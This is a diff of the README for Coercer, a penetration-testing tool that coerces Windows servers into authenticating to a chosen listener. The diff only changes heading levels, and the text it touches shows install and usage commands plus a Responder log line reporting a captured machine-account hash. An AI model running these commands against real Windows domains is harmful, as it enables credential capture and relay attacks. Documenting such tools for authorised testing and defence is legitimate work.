@@ -21,20 +21,20 @@ A python script to automatically coerce a Windows server to authenticate on an a
 * [x] Perform coerce attack on a list of targets from a file with `--targets-file`
 * [x] Coerce to a WebDAV target with `--webdav-host` and `--webdav-port`
 
-### Installation
+## Installation
 
 ```plain
 sudo python3 -m pip install coercer
 ```
 
-### Usage
+## Usage
 
 ```plain
 Coercer.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [--hashes [LMHASH]:NTHASH] [--no-pass] [-v] [-a] [-k] [--dc-ip ip address] [-l LISTENER] [-wh WEBDAV_HOST] [-wp WEBDAV_PORT]
                   (-t TARGET | -f TARGETS_FILE) [--target-ip ip address]
 ```
 
-### Flags
+## Flags
 
 ```plain
 Automatic windows authentication coercer over various RPC calls.
@@ -70,7 +70,7 @@ options:
                         WebDAV port of the server to authenticate to.
 ```
 
-### Examples
+## Examples
 
 Starting Coercer against `10.0.0.20` to trigger authentication.
 
@@ -138,6 +138,6 @@ $ sudo ./Responder.py -I eth0 --analyze
 [*] Skipping previously captured hash for OFFSEC\DC19$
 ```
 
-### URL list
+## URL List
 
 * [Github.com - Coercer](https://github.com/p0dalirius/Coercer)
